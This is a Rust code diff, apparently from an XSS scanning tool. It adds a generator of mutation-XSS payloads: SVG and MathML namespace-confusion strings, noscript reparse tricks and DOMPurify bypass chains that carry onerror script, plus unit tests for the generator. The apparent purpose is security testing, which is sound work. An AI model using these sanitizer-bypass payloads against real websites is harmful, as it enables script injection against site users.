@@ -38,6 +38,44 @@ pub fn get_dynamic_xss_html_payloads() -> Vec<String> {
     out
 }
 
+/// Generate mXSS (mutation XSS) payloads that exploit browser HTML parser quirks
+/// such as namespace confusion, innerHTML re-parsing, and DOMPurify bypass patterns.
+pub fn get_mxss_payloads() -> Vec<String> {
+    let templates = [
+        // SVG foreignObject namespace confusion
+        "<svg><foreignobject><img src=x onerror={JS} class={CLASS}></foreignobject></svg>",
+        "<svg><foreignObject><body onload={JS} class={CLASS}></foreignObject></svg>",
+        // Math/mtext namespace confusion
+        "<math><mtext><img src=x onerror={JS} class={CLASS}></mtext></math>",
+        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror={JS} class={CLASS}>",
+        // Noscript/textarea/title innerHTML reparse
+        "<noscript><img src=x onerror={JS} class={CLASS}></noscript>",
+        // DOMPurify bypass patterns (form-math-mtext chain)
+        "<form><math><mtext></form><form><mglyph><svg><mtext><style><img src=x onerror={JS} class={CLASS}>",
+        // Template/style-based mutation
+        "<svg></p><style><a id=\"</style><img src=x onerror={JS} class={CLASS}>\">",
+        // annotation-xml encoding reparse
+        "<math><annotation-xml encoding=\"text/html\"><img src=x onerror={JS} class={CLASS}></annotation-xml></math>",
+        // SVG desc/title namespace confusion
+        "<svg><desc><img src=x onerror={JS} class={CLASS}></desc></svg>",
+        // ID variants
+        "<svg><foreignobject><img src=x onerror={JS} id={ID}></foreignobject></svg>",
+        "<math><mtext><img src=x onerror={JS} id={ID}></mtext></math>",
+        "<math><annotation-xml encoding=\"text/html\"><img src=x onerror={JS} id={ID}></annotation-xml></math>",
+    ];
+
+    let mut out = Vec::new();
+    for js in crate::payload::XSS_JAVASCRIPT_PAYLOADS_SMALL.iter() {
+        for tmpl in templates.iter() {
+            let with_js = tmpl.replace("{JS}", js);
+            let with_class = with_js.replace("{CLASS}", crate::scanning::markers::class_marker());
+            let with_id = with_class.replace("{ID}", crate::scanning::markers::id_marker());
+            out.push(with_id);
+        }
+    }
+    out
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -76,6 +114,39 @@ mod tests {
             attrs.iter().any(|p| p.contains("alert(1)")),
             "should include alert(1) primitive"
         );
+    }
+
+    #[test]
+    fn test_get_mxss_payloads_non_empty() {
+        let payloads = get_mxss_payloads();
+        assert!(!payloads.is_empty(), "mXSS payloads should not be empty");
+    }
+
+    #[test]
+    fn test_get_mxss_payloads_contains_svg_foreignobject() {
+        let payloads = get_mxss_payloads();
+        assert!(
+            payloads.iter().any(|p| p.contains("foreignobject") || p.contains("foreignObject")),
+            "should contain SVG foreignObject payloads"
+        );
+    }
+
+    #[test]
+    fn test_get_mxss_payloads_contains_math_mtext() {
+        let payloads = get_mxss_payloads();
+        assert!(
+            payloads.iter().any(|p| p.contains("mtext")),
+            "should contain math/mtext payloads"
+        );
+    }
+
+    #[test]
+    fn test_get_mxss_payloads_contains_markers() {
+        let payloads = get_mxss_payloads();
+        let cls = crate::scanning::markers::class_marker();
+        let idm = crate::scanning::markers::id_marker();
+        let has_marker = payloads.iter().any(|p| p.contains(cls) || p.contains(idm));
+        assert!(has_marker, "mXSS payloads should contain class/id markers");
     }
 
     #[test]
